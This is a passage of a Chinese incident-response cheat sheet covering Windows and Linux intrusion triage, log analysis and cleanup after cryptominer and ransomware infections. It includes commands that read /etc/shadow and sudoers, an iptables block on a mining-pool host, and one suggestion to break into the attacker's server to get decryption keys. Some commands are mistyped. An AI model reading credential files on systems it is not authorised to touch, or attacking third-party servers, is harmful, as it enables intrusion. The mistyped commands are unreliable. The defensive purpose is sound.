‘&#123;<span class="keyword">if</span>(<span class="variable">$3</span>==0)<span class="built_in">print</span> <span class="variable">$1</span>&#125;’ /etc/passwd 查看UID 为0 的帐号</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -E “/bin/bash$” 查看可以登录的帐号</span><br><span class="line"></span><br><span class="line">crontab /etc/cron* 查看计划任务</span><br><span class="line"></span><br><span class="line">rc.local /etc/init.d chkconfig 查看Linux 自启动程序</span><br><span class="line"></span><br><span class="line">last 查看最近用户登录信息</span><br><span class="line"></span><br><span class="line">lastb 查看最近用户登录错误信息</span><br><span class="line"></span><br><span class="line"><span class="variable">$PATH</span> 系统路径环境变量</span><br><span class="line"></span><br><span class="line">strings 提取字符串</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="初步排查"><a href="#初步排查" class="headerlink" title="初步排查:"></a>初步排查:</h4><p>1.系统账号排查(通过本地用户组去可疑账号、隐藏账号，有的话就删除掉)</p>
+<p>2.事件管理器检测登陆日志,用微软的Log parser导出后分析</p>
+<p>3.可疑端口，建立的链接，排查他对应的进程，用微软的msinfo32查看进程的路径和签名是否可疑。</p>
+<p>后门排查:（权限维持:一个进程杀掉了，过段时间重新派生）</p>
+<h4 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h4><ul>
+<li><input disabled="" type="checkbox"> 1 检查系统账号安全</li>
+<li><input disabled="" type="checkbox"> 2.检查异常端口、进程</li>
+<li><input disabled="" type="checkbox"> 3.检查启动项、计划任务、服务</li>
+<li><input disabled="" type="checkbox"> 4.日志分析</li>
+</ul>
+<ol>
+<li><p>日志中搜索关键字:如:union,select等</p>
+</li>
+<li><p>分析状态码:</p>
+</li>
+</ol>
+<p>1xx information</p>
+<p>200 successful</p>
+<p>300 redirection</p>
+<p>4xx client error</p>
+<p>5xx server error</p>
+<p>3.查找可疑文件,webshell</p>
+<p>4.分析文件修改日期</p>
+<h4 id="系统日志分析"><a href="#系统日志分析" class="headerlink" title="系统日志分析"></a>系统日志分析</h4><ul>
+<li><input disabled="" type="checkbox"> \00001. 定位被入侵的主机并且立即对该主机进行断网隔离</li>
+<li><input disabled="" type="checkbox"> \00002. 确定攻击类型</li>
+<li><input disabled="" type="checkbox"> \00003. 确定被入侵的时间范围</li>
+<li><input disabled="" type="checkbox"> \00004. 定位恶意文件和入侵痕迹</li>
+<li><input disabled="" type="checkbox"> \00005. 溯源入侵来源</li>
+<li><input disabled="" type="checkbox"> \00006. 清理恶意文件&#x2F;修复漏洞</li>
+<li><input disabled="" type="checkbox"> \00007. 事件复盘</li>
+</ul>
+<h4 id="1-检测补丁情况"><a href="#1-检测补丁情况" class="headerlink" title="1.检测补丁情况:"></a>1.检测补丁情况:</h4><p>看看有没有打了最新的补丁,看看是不是用漏洞搞进来的</p>
+<p> systeminfo | uname -a</p>
+<h4 id="2-日志分析"><a href="#2-日志分析" class="headerlink" title="2.日志分析:"></a>2.日志分析:</h4><p>定位入侵路线,是系统配置出了问题(ssh 弱口令,域管理员hash 泄漏)还是WEB 服务出了问题(传马,WEB 漏洞利用)</p>
+<p> eventvwr | &#x2F;var&#x2F;log , .bash_history</p>
+<p> access.log mysql_log.log</p>
+<h4 id="3-账户信息"><a href="#3-账户信息" class="headerlink" title="3.账户信息:"></a>3.账户信息:</h4><p>先看看是不是帐户有弱口令,再看看用户的登录时间,也观察一下有没有给留后门账户</p>
+<p> quser | who last</p>
+<h4 id="4-进程分析"><a href="#4-进程分析" class="headerlink" title="4.进程分析:"></a>4.进程分析:</h4><p>定位一下看看有没有运行恶意进程</p>
+<p> procxp , pchunter | ps -aux , chkrootkit , rkhunter</p>
+<h4 id="5-文件分析"><a href="#5-文件分析" class="headerlink" title="5.文件分析:"></a>5.文件分析:</h4><p>找找Shell 和后门,看看这个是什么样的Shell</p>
+<p> lchangedfiles | find &#x2F; -ctime -1 -print</p>
+<h4 id="6-系统分析"><a href="#6-系统分析" class="headerlink" title="6.系统分析:"></a>6.系统分析:</h4><p>计划任务,自启动服务等</p>
+<p><strong>Windows :</strong></p>
+<p> 查看系统变量</p>
+<p> Windows 计划任务</p>
+<p> Windows 帐号信息</p>
+<p> SAM 文件</p>
+<p> Windows-Exploit-Suggester</p>
+<p>拔网线，关端口，封ip</p>
+<p>查攻击日志，看一下Linux的那个历史记录啊，历史命令记录，还有一个Windows的的日志，如果有异常的话，或者说突然变少的话，说明计算机被入侵，如果真被入侵了，没办法没办法的话，就就把主机给关掉好了。</p>
+<p>Windows入侵排查</p>
+<p>检查系统账号安全</p>
+<p>查看服务器是否有弱口令，远程管理端口3389，22等端口是否对公网开放</p>
+<p>检查方法：问服务器管理员，简单直接，要么简单扫描测试一下也可以</p>
+<p>查看服务器是否存在可疑账号、新增账号</p>
+<p>使用D盾或者其他小工具都可以查看隐藏账号</p>
+<p>Win+R-&gt;lusrmgr.msc</p>
+<p>结合日志，查看管理员登录时间、用户名是否存在异常</p>
+<h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="windows日志位置"><a href="#windows日志位置" class="headerlink" title="windows日志位置"></a>windows日志位置</h3><p>Windows系统日志都是在“事件查看器”下面的。</p>
+<p>具体步骤如下：</p>
+<p>我的电脑 - 右键单击 - 管理 - 计算机管理 - 系统工具 - 事件查看器 - Windows日志；</p>
+<p>Linux系统日志都是放在“&#x2F;var&#x2F;log”下面的，</p>
+<h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><p>前提：开启审核策略</p>
+<p>Win+R-&gt;eventvwr.msc-&gt;导出安全日志-&gt;LogParser进行分析</p>
+<h4 id="Web访问日志"><a href="#Web访问日志" class="headerlink" title="Web访问日志"></a>Web访问日志</h4><p>找到中间件的web日志，打包到本地进行分析</p>
+<p>Linux下可以使用Shell命令组合查询分Win+R-&gt;eventvwr.msc</p>
+<p>导出Windows的安全日志，利用LogParser进行分析</p>
+<p>检查异常端口、进程</p>
+<p>检查端口连接情况，是否有远程连接、可疑连接</p>
+<p>netstat -ano</p>
+<p>tasklist | find “PID”</p>
+<h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>使用D盾，查看可以进程，查看有没有签名信息，或者可以使用Process Explorer等工具查看</p>
+<p>找到中间件的web日志，打包到本地进行分析</p>
+<p>Linux下可以使用Shell命令组合查询分析</p>
+<h3 id="Windows系统应急响应中常用的指令？"><a href="#Windows系统应急响应中常用的指令？" class="headerlink" title="Windows系统应急响应中常用的指令？"></a>Windows系统应急响应中常用的指令？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">查看用户账号和组     lusrmgr</span><br><span class="line"></span><br><span class="line">打开lusrmgr.msc，查看是否有新增/可疑的账号</span><br><span class="line"></span><br><span class="line">敏感事件id:</span><br><span class="line"></span><br><span class="line">4624 登录成功</span><br><span class="line"></span><br><span class="line">4625 登录失败</span><br><span class="line"></span><br><span class="line">4634 注销成功</span><br><span class="line"></span><br><span class="line">4647 用户启动的注销</span><br><span class="line"></span><br><span class="line">4672 使用超级用户/管理员用户进行登录</span><br><span class="line"></span><br><span class="line">4720 创建用户</span><br><span class="line"></span><br><span class="line">4697 7045 PsExec</span><br><span class="line"></span><br><span class="line">查看自启动项        msconfig</span><br><span class="line"></span><br><span class="line">查看进程服务        taskmgr</span><br><span class="line"></span><br><span class="line">wmic process where name=&#x27;进程名&#x27; list full 4    查看进程详细信息</span><br><span class="line"></span><br><span class="line">taskkill /T /F /PID   强制关闭进程</span><br><span class="line"></span><br><span class="line">wmic process | finderstr “xxxx.exe”   获取进程的全路径  </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">查看计划任务        schtasks</span><br><span class="line"></span><br><span class="line">查看用户会话        query user</span><br><span class="line"></span><br><span class="line">查看端口和网络连接     netstat -ano</span><br><span class="line"></span><br><span class="line">查看本地共享        net share</span><br><span class="line"></span><br><span class="line">查看注册表         regedit</span><br><span class="line"></span><br><span class="line">查看日志          eventvwr</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Linux系统应急响应中常用的指令？"><a href="#Linux系统应急响应中常用的指令？" class="headerlink" title="Linux系统应急响应中常用的指令？"></a>Linux系统应急响应中常用的指令？</h3><p>查看进程   </p>
+<p>根据CPU占用率枚举进程</p>
+<p>查看对应进程详情，可以查看进程的详情，以及对应的文件：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/<span class="variable">$PID</span>/exe  </span><br><span class="line"></span><br><span class="line">file /proc/<span class="variable">$PID</span>/exe</span><br></pre></td></tr></table></figure>
+
+<p>可以使用ps 命令对疑似恶意程序的进程进行查看</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ps aux            <span class="comment">#显示所有进程，包括没有终端的进程</span></span><br><span class="line"></span><br><span class="line">ps ef             <span class="comment">#显示所有进程以及完整格式</span></span><br><span class="line"></span><br><span class="line">ps aux --<span class="built_in">sort</span> -pcpu       <span class="comment">#静态查看进程，根据cpu使用情况排行，从高到低</span></span><br><span class="line"></span><br><span class="line">ps aux --<span class="built_in">sort</span> -pmem       <span class="comment">#静态查看进程，根据内存使用情况排行，从高到低</span></span><br><span class="line"></span><br><span class="line">ps -p PID -o lstart        <span class="comment">#查看进程的启动时间</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span> -9 pid           <span class="comment">#强制杀死进程</span></span><br><span class="line"></span><br><span class="line">lsof -p  pid     查询守护进程</span><br><span class="line"></span><br><span class="line">pstree   -aphn   树状显示进程 </span><br><span class="line">​        -a 显示该进程命令行参数   </span><br><span class="line">​        -p 显示pid  </span><br><span class="line">​        -n 按照pid排序   </span><br><span class="line">​        -h 高亮当前进程以及父进程</span><br></pre></td></tr></table></figure>
+
+<p>查看网络连接</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">netstat   -antlp</span><br><span class="line">​        -a 显示所有连接和端口</span><br><span class="line">​        -n 以数字形式显示ip和port</span><br><span class="line">​        -t 显示tcp</span><br><span class="line">​        -l 显示监听的服务</span><br><span class="line">​        -p 显示建立连接的进程名以及pid</span><br><span class="line"></span><br><span class="line">ss   –antpr</span><br><span class="line">​        -a 显示所有连接和端口</span><br><span class="line">​        -n 不解析服务的名称</span><br><span class="line">​        -t 显示tcp sockets</span><br><span class="line">​        -l 显示监听的端口</span><br><span class="line">​        -p 显示监听端口的进程</span><br><span class="line">​        -r 把ip解析为域名</span><br></pre></td></tr></table></figure>
+
+<p>查看异常文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span>   -alth</span><br><span class="line">​    -a 显示所有文件</span><br><span class="line">​    -l 显示文件权限，属组属主，大小，日期</span><br><span class="line">​    \- t 按照时间顺序排序</span><br><span class="line">​    -h 高亮</span><br><span class="line">find  /  -ctime  -2   查找72小时内新增的文件</span><br></pre></td></tr></table></figure>
+
+<p>查看用户</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">last         查询最近登录的用户记录</span><br><span class="line">lastlog       查询所有用户最后一次登录的时间</span><br><span class="line">last lastb     登陆失败的用户记录</span><br><span class="line">usermod  -L   用户名   禁用用户</span><br><span class="line">userdel    -r   用户名   删除用户 </span><br></pre></td></tr></table></figure>
+
+<p>查看启动项</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files | grep <span class="built_in">enable</span>   查看启动项</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看计划任务</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -l     查看计划任务</span><br><span class="line">crontab -e     编辑计划任务</span><br><span class="line">crontab -r     删除计划任务</span><br><span class="line">crontab -u     查看某用户计划任务</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/anacrontab   查看anacron异步定时任务 </span><br></pre></td></tr></table></figure>
+
+<p>查看历史命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history      查询主机历史命令</span><br></pre></td></tr></table></figure>
+
+<p>列出所有的服务</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service --status-all</span><br><span class="line"></span><br><span class="line">chkconfig --list</span><br></pre></td></tr></table></figure>
+
+<p>crontab命令</p>
+<p>-u# 指定用户，可省略</p>
+<p>-l #列出对应的计划任务</p>
+<p>-r #删除目前的时程表</p>
+<p>-e #执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)</p>
+<p>默认编写的crontab文件会保存在 (&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
+<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/  <span class="comment">#记录了每个用户的计划任务，已用户名命名 </span></span><br><span class="line"></span><br><span class="line">/etc/crontab <span class="comment">#系统级配置文件</span></span><br><span class="line"></span><br><span class="line">/etc/cron.d/ <span class="comment">#该文件夹下一般是系统级别的用来管理其他定时任务的crontab文件</span></span><br><span class="line"></span><br><span class="line">/etc/cron.daily/* <span class="comment">#存放可执行脚本</span></span><br><span class="line"></span><br><span class="line">/etc/cron.hourly/* <span class="comment">#存放可执行脚本 </span></span><br><span class="line"></span><br><span class="line">/etc/cron.monthly/* <span class="comment">#存放可执行脚本</span></span><br><span class="line"></span><br><span class="line">/etc/cron.weekly/* <span class="comment">#存放可执行脚本</span></span><br><span class="line"></span><br><span class="line">/etc/anacrontab <span class="comment">#开机之后检查该执行的是否执行了，将没有进行的</span></span><br><span class="line"></span><br><span class="line">crontab任务执行一遍</span><br><span class="line"></span><br><span class="line">/var/spool/anacron/*</span><br><span class="line"></span><br><span class="line">日志记录位置</span><br><span class="line"></span><br><span class="line">/var/log/cron</span><br></pre></td></tr></table></figure>
+
+<h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/cron.daily/*  <span class="comment">#查看目录下所有文件</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="三、Linux入侵排查"><a href="#三、Linux入侵排查" class="headerlink" title="三、Linux入侵排查"></a>三、Linux入侵排查</h3><p>账号安全</p>
+<p>文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">/etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>命令：who，w，uptime，usermod，userdel</p>
+<p>入侵排查</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询特权用户：awk -F: ‘<span class="variable">$3</span>==0&#123;<span class="built_in">print</span> <span class="variable">$1</span>&#125;’ /etc/passwd</span><br><span class="line">查询可以远程登录的账号：awk ‘/\<span class="variable">$1</span>|\<span class="variable">$6</span>/&#123;<span class="built_in">print</span> <span class="variable">$1</span>&#125;’ /etc/shadow</span><br><span class="line">查询具有sudo权限的账号：more /etc/sudoers | grep -v “^<span class="comment">#\|^$” grep “ALL=(ALL)”</span></span><br></pre></td></tr></table></figure>
+
+<p>历史命令</p>
+<p>命令：history</p>
+<p>入侵排查：cat .bash_history &gt;&gt;history.txt</p>
+<p>检查异常端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure>
+
+<p>检查异常进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure>
+
+<p>检查开机启动项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local</span><br><span class="line"></span><br><span class="line">/etc/rc.d/rc[0-6].d</span><br><span class="line"></span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure>
+
+<p>检查定时任务</p>
+<p>检查以下目录下是否有可疑文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line"></span><br><span class="line">/etc/crontab</span><br><span class="line"></span><br><span class="line">/etc/cron.d/*</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/* </span><br><span class="line"></span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line"></span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line"></span><br><span class="line">/etc/cron.weekly/</span><br><span class="line"></span><br><span class="line">/etc/anacrontab</span><br><span class="line"></span><br><span class="line">/var/spool/anacron/*</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/*</span><br></pre></td></tr></table></figure>
+
+<p>检查服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig</span><br></pre></td></tr></table></figure>
+
+<p>修改&#x2F;etc&#x2F;re.d&#x2F;rc.local文件，加入&#x2F;etc&#x2F;init.d&#x2F;httpd start</p>
+<p>使用nesysv命令管理自启动</p>
+<p>检查异常文件</p>
+<p>查看敏感目录，如tmp目录下的文件，同时注意隐藏文件夹，以”..”为名的文件夹具有隐藏属性</p>
+<p>检查系统日志</p>
+<p>日志默认存放位置：&#x2F;var&#x2F;log</p>
+<h2 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h2><h3 id="1、定位有多少IP在爆破主机的root帐号："><a href="#1、定位有多少IP在爆破主机的root帐号：" class="headerlink" title="1、定位有多少IP在爆破主机的root帐号："></a>1、定位有多少IP在爆破主机的root帐号：</h3><p>grep “Failed password for root” &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more</p>
+<p>定位有哪些IP在爆破：</p>
+<p>grep”Failedpassword”&#x2F;var&#x2F;log&#x2F;secure|grep-E-o “(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)”|uniq -c</p>
+<p>爆破用户名字典是什么？</p>
+<p>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure|perl -e ‘while($_&#x3D;&lt;&gt;){ &#x2F;for(.*?) from&#x2F;; print “$1\n”;}’|uniq -c|sort -nr</p>
+<h3 id="2、登录成功的IP有哪些："><a href="#2、登录成功的IP有哪些：" class="headerlink" title="2、登录成功的IP有哪些："></a>2、登录成功的IP有哪些：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+
+<p>登录成功的日期、用户名、IP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br></pre></td></tr></table></figure>
+
+<h3 id="3、增加一个用户kali日志："><a href="#3、增加一个用户kali日志：" class="headerlink" title="3、增加一个用户kali日志："></a>3、增加一个用户kali日志：</h3><p>Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</p>
+<p>Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</p>
+<p>, shell&#x3D;&#x2F;bin&#x2F;bash</p>
+<p>Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</p>
+<p>#grep “useradd” &#x2F;var&#x2F;log&#x2F;secure </p>
+<h3 id="4、删除用户kali日志："><a href="#4、删除用户kali日志：" class="headerlink" title="4、删除用户kali日志："></a>4、删除用户kali日志：</h3><p>Jul 10 00:14:17 localhost userdel[2393]: delete user ‘kali’</p>
+<p>Jul 10 00:14:17 localhost userdel[2393]: removed group ‘kali’ owned by ‘kali’</p>
+<p>Jul 10 00:14:17 localhost userdel[2393]: removed shadow group ‘kali’ owned by ‘kali’</p>
+<p># grep “userdel” &#x2F;var&#x2F;log&#x2F;secure</p>
+<p>5、su切换用户：</p>
+<p>Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</p>
+<p>sudo授权执行:</p>
+<p>sudo -l</p>
+<p>Jul 10 00:43:09 localhost sudo: good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</p>
+<h2 id="挖矿木马与勒索病毒"><a href="#挖矿木马与勒索病毒" class="headerlink" title="挖矿木马与勒索病毒"></a>挖矿木马与勒索病毒</h2><p>挖矿木马处置</p>
+<h3 id="1）及时隔离主机"><a href="#1）及时隔离主机" class="headerlink" title="1）	及时隔离主机"></a>1）	及时隔离主机</h3><p>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机，对同 一局域网内的其他主机进行已知漏洞的扫描和进一步利用，所以发现挖矿现象后, 在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析，</p>
+<h3 id="2）阻断与矿池通讯"><a href="#2）阻断与矿池通讯" class="headerlink" title="2）	阻断与矿池通讯"></a>2）	阻断与矿池通讯</h3><p>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</p>
+<p>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP </p>
+<h3 id="3）清除定时任务"><a href="#3）清除定时任务" class="headerlink" title="3）清除定时任务"></a>3）清除定时任务</h3><p>大部分挖矿进程会在受感染主机中写入定时任务完成程序的驻留，当安全人员只 清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或直接执行挖矿脚本, 导致挖矿进程清除失败。</p>
+<h3 id="4）清除启动项"><a href="#4）清除启动项" class="headerlink" title="4）	清除启动项"></a>4）	清除启动项</h3><p>有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿 进程还能重新启动。所以在清除时还应该关注启动项中的内容，如果有可疑的启 动项，也应该进行排查，确认是挖矿进程后，对其进行清除，</p>
+<h3 id="5）清除公钥文件"><a href="#5）清除公钥文件" class="headerlink" title="5）	清除公钥文件"></a>5）	清除公钥文件</h3><p>在用户家目录的.ssh目录下放置authoruzed_keys文件，从而免密登录该机器也 是一种常见的保持服务器控制权的手段，在排查过程中应该查看该文件中是否有 可疑公钥信息，有的话直接删除，避免攻击者再次免密登录该主机.</p>
+<h3 id="6）kill挖矿进程"><a href="#6）kill挖矿进程" class="headerlink" title="6）	kill挖矿进程"></a>6）	kill挖矿进程</h3><p>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如 果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底. 在实际的清除工作中’应找到本机上运行的挖矿脚本，根据脚本的执行流程确定 木马的驻留方式，并按照顺序进行清除，避免清除不彻底.</p>
+<h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><h3 id="勒索病毒样本载体的主要行为："><a href="#勒索病毒样本载体的主要行为：" class="headerlink" title="勒索病毒样本载体的主要行为："></a>勒索病毒样本载体的主要行为：</h3><ul>
+<li><input disabled="" type="checkbox"> 1、调用加密算法库；</li>
+<li><input disabled="" type="checkbox"> 2、通过脚本文件进行Http请求；</li>
+<li><input disabled="" type="checkbox"> 3、通过脚本文件下载文件；</li>
+<li><input disabled="" type="checkbox"> 4、读取远程服务器文件；</li>
+<li><input disabled="" type="checkbox"> 5、通过wscript执行文件；</li>
+<li><input disabled="" type="checkbox"> 6、收集计算机信息；</li>
+<li><input disabled="" type="checkbox"> 7、遍历文件。</li>
+</ul>
+<h3 id="处置"><a href="#处置" class="headerlink" title="处置"></a>处置</h3><p>（1）物理，网络隔离染毒机器；</p>
+<p>（2）对于内网其他未中毒电脑，排查系统安全隐患：</p>
+<p>a）系统和软件是否存在漏洞</p>
+<p>b）是否开启了共享及风险服务或端口，如135、137、139、445、3389</p>
+<p>c）只允许办公电脑，访问专门的文件服务器。使用FTP，替代文件夹共享。</p>
+<p>d）检查机器ipc空连接及默认共享是否开启</p>
+<p>e）检查是否使用了统一登录密码或者弱密码</p>
+<p>（3） 尽量不要点击office宏运行提示，避免来自office组件的病毒感染；</p>
+<p>（4）尽量不要双击打开.js、.vbs等后缀名文件；</p>
+<p>（5）事后处理</p>
+<h4 id="在无法直接获得安全专业人员支持的情况下，可考虑如下措施："><a href="#在无法直接获得安全专业人员支持的情况下，可考虑如下措施：" class="headerlink" title="在无法直接获得安全专业人员支持的情况下，可考虑如下措施："></a>在无法直接获得安全专业人员支持的情况下，可考虑如下措施：</h4><ul>
+<li><input disabled="" type="checkbox"> 1.通过管家勒索病毒搜索引擎搜索，获取病毒相关信息。</li>
+<li><input disabled="" type="checkbox"> 若支持解密，可直接点击下载工具对文件进行解密</li>
+<li><input disabled="" type="checkbox"> 2.勒索软件本身算法存在缺陷，内存中可找到密钥；</li>
+<li><input disabled="" type="checkbox"> 3.攻击者服务器比较脆弱，通过攻陷服务器，获取解密密钥；</li>
